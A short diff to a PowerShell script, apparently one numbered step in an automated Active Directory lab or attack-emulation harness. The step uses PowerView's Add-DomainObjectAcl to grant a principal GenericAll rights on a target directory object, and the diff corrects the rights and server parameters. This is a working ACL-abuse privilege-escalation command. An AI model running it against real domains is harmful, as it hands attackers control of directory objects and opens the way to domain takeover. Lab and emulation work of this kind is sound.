@@ -24,7 +24,7 @@ if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
 $ErrorActionPreference = "Stop";
 $u = "'''"${DOMAIN_ROOT}\${PRINCIPAL}"'''";
 $dn = "'''"${TARGET_DN}"'''";
-Add-DomainObjectAcl -Identity $dn -PrincipalIdentity $u -Rights All -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
+Add-DomainObjectAcl -Identity $dn -PrincipalIdentity $u -Rights GenericAll -Server "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" -Verbose;
 Write-Output "T013_OK: granted GenericAll/WriteDacl to $u on $dn"
 '
 
